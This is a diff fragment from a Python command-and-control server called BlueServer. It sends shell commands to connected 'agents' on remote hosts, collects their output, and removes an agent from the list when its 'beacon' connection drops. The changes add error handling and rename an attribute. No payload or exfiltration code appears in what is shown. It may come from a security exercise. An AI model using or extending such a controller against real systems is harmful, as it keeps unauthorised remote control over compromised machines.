@@ -56,9 +56,16 @@ class BlueServer:
                 cmd = cmd.strip()
                 cmd = "cmd|"+cmd
                 for target in self.targets:
-                    target.sock.send(cmd.encode())
-                    reply = target.sock.recv(1024).decode()
-                    print(str(target),reply,sep="\n")
+                    try:
+                        target.sock.send(cmd.encode())
+                        reply = target.sock.recv(65535).decode()
+                        print(str(target),reply,sep="\n")
+                    except UnicodeDecodeError:
+                        print(str(target)+"\nUnicode Decode Error")
+                    except ConnectionResetError:
+                        print(str(target)+f"\nERROR: Connection reset\nBeacon got popped :(\nRemoving Agent #{target.number} from connection list\n")
+                        self.connections.remove(target)
+                        self.targets.remove(target)
             elif userin.upper() == "SHOW CONNECTIONS" or userin.upper() == "SHOW CONNS":
                 for conn in self.connections:
                     if conn != self.connections[-1]:
@@ -102,7 +109,7 @@ class BlueServer:
 
     def ip_to_agent(self,ip):
         for agent in self.connections:
-            if agent.ip == ip:
+            if agent.ipaddr == ip:
                 return agent
         return None #null return if no agents match
 
